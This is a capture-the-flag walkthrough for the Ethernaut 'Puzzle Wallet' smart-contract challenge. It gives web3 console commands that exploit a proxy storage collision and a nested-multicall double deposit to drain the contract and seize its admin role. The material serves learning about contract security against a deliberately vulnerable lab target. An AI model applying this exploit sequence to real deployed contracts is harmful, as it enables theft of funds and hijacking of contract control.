## Puzzle Wallet

1. I solved this on second day. This is tricky but actually not that hard, you should watch D-squared video for this challenge, if you already understand how proxy storage works and calls...

2. The things to keep in mind is the PuzzelProxy and PuzzelWallet share the same storage, owner and pendingAdmin share same storage as well as admin and maxBalance share same storage.

3. To be pendingAdmin or owner it is fairly easy just call the proposeNewAdmin(), I have already explained how to do that using remix in past so calling them using contractABI is good to understand javascript and i can copy paste them.

```javascript
functionSig = {
  name: "proposeNewAdmin",
  type: "function",
  inputs: [{ type: "address", name: "_newAdmin" }],
};
```

`params = [player]`

`data = web3.eth.abi.encodeFunctionCall(functionSig, params)`

Calling proposeNewAdmin()
`await web3.eth.sendTransaction({from: player, to: instance, data})`

> Here, we call the proposeNewAdmin() and functionSig is used to create the 4byte signature (i.e. passed as data) and address is passed in params for better understanding of what is happening.

4. We add the player to whitelist and since are already owner.

`await contract.addToWhitelist(player)`

5. We get the 4byte signature of deposit by below line
   `depositData = await contract.methods["deposit()"].request().then(v=> v.data)`
6. We get the data to be passed for multicallData()

multicallData = await contract.methods["multicall(bytes[])"].request([depositData]).then(v => v.data)

7. We call the multicall() using below code, which is called twice because after depositCalled is reversed to true in if {} block then it call be called again.. i think is the code for another vulnerability which was not discussed in video?

`await contract.multicall([multicallData, multicallData], {value: toWei('0.001')})`

`await getBalance(instance)`

8. We call execute() that lets us take the maxBalance out `await contract.execute(player, toWei('0.002'), 0x0)`

9. The final part in setting the admin which is also maxBalance state variable `await contract.setMaxBalance(player)`

10. success

> more refs added,`https://www-kiendt-me.translate.goog/2022/03/01/the-ethernaut-24/?_x_tr_sl=vi&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=sc` - `https://medium.com/@appsbylamby/ethernaut-24-puzzle-wallet-walkthrough-mastering-the-proxy-pattern-cc830dc364ce`
